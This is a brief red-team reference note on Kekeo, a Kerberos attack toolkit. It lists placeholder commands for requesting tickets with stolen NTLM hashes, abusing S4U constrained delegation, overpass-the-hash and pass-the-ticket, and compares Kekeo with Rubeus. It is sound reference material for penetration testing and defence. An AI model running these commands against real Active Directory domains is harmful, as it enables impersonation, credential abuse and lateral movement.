---
title: Kekeo
aliases: ["kekeo", "kekeo.exe"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Benjamin Delpy (gentilkiwi)"
source_url: "https://github.com/gentilkiwi/kekeo"
verified: true
related: ["[[Kerberos]]", "[[Constrained Delegation]]", "[[Rubeus]]", "[[Mimikatz]]", "[[Overpass-the-Hash]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Kekeo

> [!summary] One-liner
> Benjamin Delpy's dedicated Kerberos manipulation toolkit — handles TGT/ST requests, S4U abuse, and delegation attacks. Largely superseded by [[Rubeus]] (C# reimplementation) but still useful for some scenarios.

## Key modules
```
# Request a TGT with password or hash
tgt::ask /user:<USER> /domain:<DOMAIN> /password:<PASS>
tgt::ask /user:<USER> /domain:<DOMAIN> /ntlm:<HASH>

# S4U2self + S4U2proxy (constrained delegation abuse)
tgs::s4u /tgt:<TGT.kirbi> /user:<IMPERSONATE_USER> /service:<SPN>

# Overpass-the-hash (request TGT from NT hash)
tgt::ask /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /enctype:aes256

# Pass-the-ticket
kerberos::ptt <TICKET.kirbi>
```

## Kekeo vs. Rubeus
[[Rubeus]] is the C# successor with the same (and expanded) Kerberos capabilities — preferred in most modern engagements because it's a single .NET assembly, works with execute-assembly, and has more features (asktgs, tgtdeleg, harvest, monitor). Kekeo remains relevant for edge cases and as the original reference implementation.

## Related
- Successor: [[Rubeus]].
- Same author: [[Mimikatz]].
- Techniques: [[Constrained Delegation]], [[Overpass-the-Hash]], [[Kerberos]].
